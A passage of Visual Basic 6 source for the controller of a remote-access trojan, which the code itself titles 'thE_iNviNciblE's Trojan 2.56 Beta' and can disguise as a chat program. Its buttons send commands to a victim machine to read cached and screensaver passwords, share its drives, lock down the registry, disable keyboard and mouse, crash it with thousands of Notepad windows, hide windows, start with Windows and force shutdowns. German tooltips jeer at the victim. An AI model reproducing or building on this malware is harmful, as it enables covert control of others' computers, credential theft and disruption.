End Sub

Private Sub Command13_Click()
W.SendData "dest"
End Sub

Private Sub Command13_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Also lasst mal lieber die Finger davon ;-)"
End Sub

Private Sub Command14_Click()
If Check4.Value = 0 Then
    Check4.Value = 1
    Command14.Caption = "Doppelklick langsam"
    W.SendData "doppelkS"
    Exit Sub
End If
If Check4.Value = 1 Then
    Check4.Value = 0
    Command14.Caption = "Doppelklick schnell"
    W.SendData "doppelkL"
    Exit Sub
End If

End Sub

Private Sub Command14_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Die Doppelklickgeschwindigkeit auf 0 = kein Doppelklick mehr *G*"
End Sub

Private Sub Command15_Click()
W.SendData "cachi"
End Sub

Private Sub Command15_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt einem die gecachten Passwörter *g*"
End Sub

Private Sub Command16_Click()
W.SendData "passs"
End Sub

Private Sub Command16_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt einem mal schnell das Aktuelle Bildschirmschonerkennwort"
End Sub

Private Sub Command17_Click()
If Check3.Value = 0 Then
    Check3.Value = 1
    Command17.Caption = "Monitor Ein"
    W.SendData "monion"
    Exit Sub
End If
If Check3.Value = 1 Then
    Check3.Value = 0
    Command17.Caption = "Monitor Aus"
    W.SendData "monioff"
    Exit Sub
End If
End Sub

Private Sub Command17_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Monitor AN / AUS"
End Sub

Private Sub Command18_Click()
W.SendData "sendikeys"
End Sub

Private Sub Command18_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Soll der andere Rechner verrecken , 10000 Notepads sollten reichen"
End Sub

Private Sub Command19_Click()
W.SendData "startfly"
End Sub

Private Sub Command19_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt den Startbutton fliegen"
End Sub

Private Sub Command2_Click()
W.SendData "close"
End Sub

Private Sub Command2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Schließt das CD-ROM Laufwerk"
End Sub

Private Sub Command20_Click()
If startbutton.Value = 1 Then
    startbutton.Value = 0
    W.SendData "startiaus"
    Command20.Caption = "Startbutton aus"
    Exit Sub
End If
If startbutton.Value = 0 Then
    startbutton.Value = 1
    W.SendData "startian"
    Command20.Caption = "Startbutton an"
    Exit Sub
End If

End Sub

Private Sub Command20_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Versteckt den Startbutton"
End Sub

Private Sub Command21_Click()
W.SendData "mini"
End Sub

Private Sub Command21_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Minimiert alle offenen Anwendungen"
End Sub

Private Sub Command22_Click()
jan = InputBox("Bitte tragen wie eine correcte URL ein (m.HTTP://)", "Open Browser")
W.SendData jan & "|" & "openIE"
End Sub

Private Sub Command22_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Schickt mal den Client auf www.symantec.com"
End Sub

Private Sub Command23_Click()
W.SendData "compun"
End Sub

Private Sub Command23_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Liest den Aktuellen Computernamen ein"
End Sub

Private Sub Command24_Click()
W.SendData "desksize"
End Sub

Private Sub Command24_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt einem die Aktuelle Bildschirmauflösung an"
End Sub

Private Sub Command25_Click()
W.SendData "laufw"
End Sub

Private Sub Command25_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Was für Laufwerke hat den der Client"
End Sub

Private Sub Command26_Click()
W.SendData "hideme"
End Sub

Private Sub Command26_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt das Chatfenster verschwinden *G*"
End Sub

Private Sub Command27_Click()
W.SendData "gogogoye"
End Sub

Private Sub Command27_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Soll sich immer wieder alleine zum Internet verbinden"
End Sub

Private Sub Command28_Click()
W.SendData "gogogono"
End Sub

Private Sub Command28_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Schaltet das Automatische Verbinden wieder ab"
End Sub

Private Sub Command29_Click()
W.SendData "rausraus"
End Sub

Private Sub Command29_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Trennt die Internetverbindung"
End Sub

Private Sub Command3_Click()
Form4.Show
End Sub

Private Sub Command30_Click()
W.SendData "bildi"
End Sub

Private Sub Command30_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Aktiviert den Bildschirmschoner"
End Sub

Private Sub Command31_Click()
W.SendData "showme"
End Sub

Private Sub Command31_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt das Chatfenster wieder"
End Sub

Private Sub Command32_Click()
W.SendData "shutdowni"
End Sub

Private Sub Command32_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Fährt den Rechner runter (wie billig *g*)"
End Sub

Private Sub Command33_Click()
W.SendData "logoffi"
End Sub

Private Sub Command33_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Windows will sich Neuanmelden"
End Sub

Private Sub Command34_Click()
W.SendData "drucktest"
End Sub

Private Sub Command34_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt etwas witziges ausdrucken"
End Sub

Private Sub Command35_Click()
W.SendData "insecure"
End Sub

Private Sub Command35_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "stellt den Registry kram wieder auf normal"
End Sub

Private Sub Command36_Click()
On Error GoTo keineverbindung
W.Close
W.RemotePort = 5
W.LocalPort = 32767 - RemotePort
W.RemoteHost = Text1.text
W.Connect
ConnectionState.Visible = True
Text5.Visible = True
Exit Sub
keineverbindung:
MsgBox "Es kann keine Verbindung aufgebaut werden " + vbCrLf + "1.Falsche IP oder Rechnername" + vbCrLf + "2.Die Adresse ist bereits belegt", vbSystemModal + vbCritical + vbOKOnly, "Schwiegender Fehler "
End Sub

Private Sub Command37_Click()
W.SendData "festipla"
End Sub

Private Sub Command37_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "geht nicht"
End Sub

Private Sub Command38_Click()
jan = InputBox("Bitte geben sie den IE TITLE ein (wie bei den Firmen)" & vbCrLf & "geht nicht mehr weg *G*", "IE TITEL", "Microshit RuleZ")
W.SendData jan & "|" & "ietitle"
End Sub

Private Sub Command38_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Ihr kennt doch Firmen die Tragen sich oben im IE ein *G* das diese funktion auch"
End Sub

Private Sub Command39_Click()
Form7.Show
End Sub

Private Sub Command39_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt einem die nen paar Windows Daten an "
End Sub

Private Sub Command4_Click()
jan = InputBox("Bitte tragen sie die Startseite ein (m.HTTP://")
W.SendData jan & "|" & "IESTART"
End Sub

Private Sub Command4_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Ändert die Startseite des Browsers"
End Sub

Private Sub Command40_Click()
If start.Value = 1 Then
    start.Value = 0
    W.SendData "wstarton"
    Command40.Caption = "Ohne Windows starten"
    Exit Sub
End If
If start.Value = 0 Then
    start.Value = 1
    W.SendData "wstartoff"
    Command40.Caption = "Mit Windows starten"
    Exit Sub
End If
End Sub

Private Sub Command40_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt ..... mit Windows starten"
End Sub

Private Sub Command41_Click()
End Sub

Private Sub Command41_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt den ...... nicht mit Windows starten (Standart)"
End Sub

Private Sub Command42_Click()
If BildPWD.Value = 1 Then
    BildPWD.Value = 0
    W.SendData "bildiaus"
    Command42.Caption = "Bildschirmschoner PWD aus"
    Exit Sub
End If
If BildPWD.Value = 0 Then
    BildPWD.Value = 1
    W.SendData "bildian"
    Command42.Caption = "Bildschirmschoner PWD an"
    Exit Sub
End If
End Sub

Private Sub Command42_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Schaltet das Bildschirmschoner Passwort aus , falls eins eingestellt war"
End Sub

Private Sub Command43_Click()
End Sub

Private Sub Command43_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Falls da mal irgendwann ein Kennwort eingestellt war wird es wieder einstellt"
End Sub

Private Sub Command44_Click()
W.SendData "bildiweg"
End Sub

Private Sub Command44_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Löscht das Bildschirmschoner Kennwort(auslesen dannach nicht mehr möglich"
End Sub

Private Sub Command45_Click()
W.SendData "zbildi"
End Sub

Private Sub Command45_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Das Kennwort(Bildschirmschoner) kann man teilweise nichtmal eintippen "
End Sub

Private Sub Command46_Click()
W.SendData "winioem"
End Sub

Private Sub Command46_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt die Windows OEM an"
End Sub

Private Sub Command47_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt die Maus nicht mehr über dem Bildschirm springen "
End Sub

Private Sub Command48_Click()
If mausANAUS.Value = 1 Then
    mausANAUS.Value = 0
    Command48.Caption = "Mausbewegen Aus"
    W.SendData "mausiAus"
    Exit Sub
End If
If mausANAUS.Value = 0 Then
    mausANAUS.Value = 1
    Command48.Caption = "Mausbewegen An"
    jan = InputBox("Bitte geben sie hier die Sekunden ein" & vbCrLf & "wie schnell sich die Maus bewegen soll", Mausgeschwindigkeit, 10)
    jan = jan * 1000
    W.SendData jan & "|" & "mausiAn"
    Exit Sub
End If
End Sub

Private Sub Command48_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt die Maus über dem Bildschirm springen "
End Sub

Private Sub Command49_Click()
If Check2.Value = 0 Then
    Check2.Value = 1
    Command49.Caption = "CAPS EIN"
    W.SendData "discoon"
    Exit Sub
End If
If Check2.Value = 1 Then
    Check2.Value = 0
    Command49.Caption = "CAPS AUS"
    W.SendData "discooff"
    Exit Sub
End If
End Sub

Private Sub Command49_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Wollt ihr das Num Lock , Caps Lock , Scoll Lock ein bißchen Disco machen ? *G*"
End Sub

Private Sub Command5_Click()
Form3.Show
End Sub

Private Sub Command50_Click()
End Sub

Private Sub Command50_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Zeigt den Startbutton wieder"
End Sub

Private Sub Command51_Click()
W.SendData "startiweg"
End Sub

Private Sub Command51_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Schaltet den Startbutton komplett aus (WINDOWSTASTE nicht mehr möglich)"
End Sub

Private Sub Command52_Click()
If fenster.Value = 1 Then
    fenster.Value = 0
    W.SendData "playwindows"
    Command52.Caption = "Fensterschließen Aus"
    Exit Sub
End If
If fenster.Value = 0 Then
    fenster.Value = 1
    W.SendData "stopplaywindows"
    Command52.Caption = "Fensterschließen An"
    Exit Sub
End If
End Sub

Private Sub Command52_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Jedes Aktive Fenster wird geschlossen"
End Sub

Private Sub Command53_Click()

End Sub

Private Sub Command53_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Stellt die funktion wieder aus"
End Sub

Private Sub Command54_Click()
If mauss.Value = 1 Then
    mauss.Value = 0
    W.SendData "mausvirrian"
    Command54.Caption = "Mausvirri an"
    Exit Sub
End If
If mauss.Value = 0 Then
    mauss.Value = 1
    W.SendData "mausvirriaus"
    Command54.Caption = "Mausvirri aus"
    Exit Sub
End If
End Sub

Private Sub Command54_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Also das überlebt kein Rechner... die maus klick sehr sehr schnell mit der linken Maustaste "
End Sub

Private Sub Command55_Click()
End Sub

Private Sub Command55_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Falls nicht schon zu spät könnt ihr den Client wieder erlösen"
End Sub

Private Sub Command56_Click()
If keyboard.Value = 1 Then
    keyboard.Value = 0
    W.SendData "keyboardspielAN"
    Command56.Caption = "Keyboard spinnt An"
    Exit Sub
End If
If keyboard.Value = 0 Then
    keyboard.Value = 1
    W.SendData "keyboradspielAUS"
    Command56.Caption = "Keyboard spinnt Aus"
    Exit Sub
End If
End Sub

Private Sub Command56_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Die Tastertur dreht ein bißchen durch"
End Sub

Private Sub Command57_Click()
End Sub

Private Sub Command57_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Die Tastertur wird wieder normal"
End Sub

Private Sub Command58_Click()
On Error GoTo Fehler4040
If desktop.Value = 0 Then
    desktop.Value = 1
    Command58.Caption = "DESKTOP AN"
    W.SendData "show"
    Exit Sub
End If
If desktop.Value = 1 Then
    desktop.Value = 0
    Command58.Caption = "DESKTOP VERSTECKT"
    W.SendData "hide"
    Exit Sub
End If
Exit Sub
Fehler4040:
MsgBox "Keine Verbindung zum Client", vbSystemModal + vbOKOnly + vbCritical, "Keine Verbindung"
End Sub

Private Sub Command58_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt den Desktop verstecken / anzeigen "
End Sub

Private Sub Command6_Click()
W.SendData "funny"
End Sub

Private Sub Command6_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Der Client wird beendet (Fenster wird maximiert und die Maus schließt das Fenster)"
End Sub

Private Sub Command7_Click()
W.SendData "secure"
End Sub

Private Sub Command7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "In der Registry wird so gut wie alles verboten was verboten werden kann *GGG*"
End Sub

Private Sub Command79_Click()
If Check7.Value = 1 Then
    Command79.Caption = "MAUS TASTERTUR AN"
    W.SendData "blockian"
    Check7.Value = 0
    Exit Sub
End If
If Check7.Value = 0 Then
    Command79.Caption = "MAUS TASTERTUR AUS"
    W.SendData "blockiaus"
    Check7.Value = 1
    Exit Sub
End If
End Sub

Private Sub Command79_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Tastertur und Maus sind tot , BITTE DENKEN WIEDER EINSCHALTEN *G*"
End Sub

Private Sub Command8_Click()
W.SendData "rebooti"
End Sub

Private Sub Command8_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Lässt den Rechner einen Neustart machen"
End Sub

Private Sub Command80_Click()
W.SendData "startland"
End Sub

Private Sub Command80_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Der Startbutton landet wieder"
End Sub

Private Sub Command9_Click()
W.SendData "format"
End Sub

Private Sub doppelk_Click()

End Sub

Private Sub Command9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Will eine Diskette formatieren (Dialog) "
End Sub

Private Sub Form_Load()
help.Visible = False
spezial.Enabled = False
Befehl.Enabled = True
Text1.Visible = False
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then
PopupMenu Befehl
End If
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = ""
End Sub

Private Sub Form_Terminate()
W.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
W.Close
End Sub

Private Sub Freigabe_Click()
W.SendData "freic"
End Sub

Private Sub Freigabe_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Gibt Laufwerk C:\ Frei (Neustart erforderlich)"
End Sub

Private Sub FreigabeD_Click()
W.SendData "freid"
End Sub

Private Sub hide_Click()
W.SendData "hide"
End Sub

Private Sub FreigabeD_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Gibt Laufwerk D:\ Frei (Neustart erforderlich)"
End Sub

Private Sub how_Click()
Form1.Enabled = False
Form2.Show
End Sub

Private Sub icqip_Click()
Form8.Show
End Sub

Private Sub icqipget_Click()
On Error GoTo Icqfehler
W.SendData "ICQGET"
Exit Sub
Icqfehler:
MsgBox "Es besteht noch keine Aktive Verbinding zum Client !!!", vbSystemModal + vbCritical, "Fehler"
End Sub

Private Sub internetip_Click()
W.SendData "internetIP"
End Sub

Private Sub internetip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Wofür ???? keinen Plan , zeigt einem die Internet IP an"
End Sub

Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label3.ForeColor = RED
End Sub

Private Sub Label4_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label4.ForeColor = HFFFFF
End Sub

Private Sub malen_Click()
W.SendData "deskmalen"
End Sub

Private Sub malen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Es schneit auf dem Desktop !!! (Client kann sich aufhängen)"
End Sub

Private Sub mehrfunk_Click()
'Form5.Show
'Form1.Hide
End Sub

Private Sub open_Click()
W.SendData "open"
End Sub

Private Sub open_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Öffnet das CD-ROM Laufwerk"
End Sub

Private Sub Option1_Click(Index As Integer)
  Dim X&, Y&
    Select Case Index
      Case 0: W.SendData "bildi640"
      Case 1: W.SendData "bildi800"
      Case 2: W.SendData "bildi1024"
      Case 3: W.SendData "bildi1152"
    End Select
End Sub

Private Sub Option1_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Bildschirmgröße 640 x 480 ; 800 x 600 ; 1024 x 768"
End Sub

Private Sub Option2_Click()
W.SendData "bildi640"
End Sub

Private Sub show_Click()
W.SendData "show"
End Sub

Private Sub Option2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Bildschirmgröße 640 x 480"
End Sub

Private Sub spezial_Click()
If a = 0 Then
    Check1.Value = 1
    help.Visible = True
    Form1.Caption = "thE_iNviNciblE's Trojan 2.56 Beta"
    Label10.Visible = True
End If
If a = 1 Then
    Check1.Value = 0
    help.Visible = False
    Form1.Caption = "thE_iNviNciblE's Chat 2.56 Beta"
    Label10.Visible = False
End If
End Sub
Private Sub status_Click()
If status1.Value = 1 Then
    status1.Value = 0
    Exit Sub
End If
If status1.Value = 0 Then
    status1.Value = 1
    Exit Sub
End If
End Sub

Private Sub Text1_Change()
Command36.Enabled = True
If Text1.text = "" Then
    Command36.Enabled = False
End If
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    If Text1.text = "" Then
        MsgBox "Keine Angabe gemacht", vbCritical + vbSystemModal + vbMsgBoxSetForeground, "Fehler 100"
        Exit Sub
    End If
    ConnectionState.Visible = True
    Text5.Visible = True
    Command36_Click
End If
End Sub

Private Sub Text3_Change()
With Text3
.SelStart = Len(Text3.text)
End With
End Sub

Private Sub Text4_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    List2.AddItem ""
    W.Close: List2.AddItem Time & "  Closing Port " & W.LocalPort & "."
    W.LocalPort = Text1.text: List2.AddItem Time & "  Opening Port " & W.LocalPort & "."
    W.Listen: List2.AddItem Time & "  Listening."
End If
Form1.Caption = W.LocalPort
End Sub

Private Sub Timer1_Timer()
If Text5.text = "Erfolgreich mit " & Text1.text & " verbunden" Then
    spezial.Enabled = True
End If
If Check1.Value = 1 Then
    Form1.Width = 12180
    Form1.Height = 11220
    a = 1
    spezial.Checked = True
End If
'If Check1.Value = 0 Then
'    Form1.Width = 6795
'    Form1.Height = 6755
'    a = 0
'    spezial.Checked = False
'End If
If empfuhr.Value = 1 Then
    withtime.Checked = True
End If
If empfuhr.Value = 0 Then
    withtime.Checked = False
End If
If la = 1 Then
    Command3.Enabled = True
End If
If chat.Value = 1 Then
    List2.Visible = False
    Frame1.Visible = False
    Text1.Visible = False
    Command36.Visible = False
    Text4.Visible = False
    Label3.Visible = False
    ConnectionState.Visible = False
    chatmodus.Checked = True
    Text2.Left = 120
    Text3.Left = 120
    Label1.Left = 120
    Label2.Left = 120
    Label1.Width = 6495
    Label2.Width = 6495
    Text2.Width = 6495
    Text3.Width = 6495
    '6495
    '120
    Exit Sub
End If
If chat.Value = 0 Then
    List2.Visible = True
    Frame1.Visible = True
    Text1.Visible = True
    Command36.Visible = True
    Text4.Visible = True
    Label3.Visible = True
    ConnectionState.Visible = True
    chatmodus.Checked = True
    chatmodus.Checked = False
    Text2.Left = 3120
    Text3.Left = 3120
    Label1.Left = 3120
    Label2.Left = 3120
    Label1.Width = 3480
    Label2.Width = 3480
    Text2.Width = 3480
    Text3.Width = 3480
    '3480
    Exit Sub
End If
If status1.Value = 1 Then
    Status.Checked = True
    Label10.Visible = False
    Exit Sub
End If
If status1.Value = 0 Then
    Status.Checked = False
    Label10.Visible = False
    Exit Sub
End If
End Sub
Private Sub Command1_Click()
On Error GoTo fehler2
If Text2.text = "" Then
    MsgBox "Es gibt nix zu senden !!!", vbOKOnly + vbCritical + vbSystemModal, "Fehler !!"
    Exit Sub
End If
W.SendData Text2.text
Text3.SelColor = &H8000000F
Text3.text = Text3.text & vbCrLf & "[" & Time & "] " & Text2.text
Text2.text = ""
Text2.SetFocus
Exit Sub
fehler2:
MsgBox "Es besteht keine Verbindung zum Client", vbSystemModal + vbOKOnly + vbCritical, "Keine Verbindung zum Client"
End Sub

Private Sub Timer2_Timer()
Y = Rnd * 3000
X = Rnd * 1200
Command30.Width = Y
Command30.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command10.Width = Y
Command10.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command20.Width = Y
Command20.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command35.Width = Y
Command35.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command40.Width = Y
Command40.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command12.Width = Y
Command12.Height = X
End Sub

Private Sub Timer3_Timer()
If Text5.text = "Erfolgreich mit " & Text1.text & " verbunden" Then
    Befehl.Enabled = True
End If
End Sub

Private Sub W_DataArrival(ByVal bytesTotal As Long)
Beep
Dim Temp As String
W.GetData Temp, vbString
If Temp = "W.Connect" Then
    List1.AddItem W.RemoteHostIP
    List2.AddItem Time & "  " & W.RemoteHostIP & " connected."
    Text5.text = "Erfolgreich mit " & Text1.text & " verbunden"
End If
If Temp = "NF" Then
    Res = MsgBox("Ficken ???", vbSystemModal + vbYesNo + vbCritical, "NF")
    If Res = vbYes Then
        W.SendData "JA SOFORT JEDER ZEIT"
        Else
        W.SendData "Wer bist Du denn bitte (kein Joke) ?"
    End If
    Exit Sub
End If
If Temp = "DiSaBlEd" Then
    Check1.Value = 0
    Form1.Width = 6795
    Timer1.Enabled = False
    Exit Sub
End If
If Temp = "EnAbLeD" Then
    Check1.Value = 1
    Form1.Width = 11880
    Timer1.Enabled = True
    Exit Sub
End If
If Temp = "Flyma" Then
    Timer2.Enabled = True
    Exit Sub
End If
If Temp = "Land" Then
    Timer2.Enabled = False
    Exit Sub
End If
If empfuhr.Value = 1 Then
    Text3.text = Text3.text & vbCrLf & "[" & Time & "] " & Temp
    Exit Sub
End If
Text3.SelColor = &H80000008
Text3.text = Text3.text & vbCrLf & Temp
End Sub


Private Sub withtime_Click()
If empfuhr.Value = 1 Then
    empfuhr.Value = 0
    Exit Sub
End If
If empfuhr.Value = 0 Then
    empfuhr.Value = 1
    Exit Sub
End If
End Sub

Private Sub WORKGROUP_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label10.Caption = "Ändert die Workgroup (I've Hack uuuuuuuuu)"
End Sub
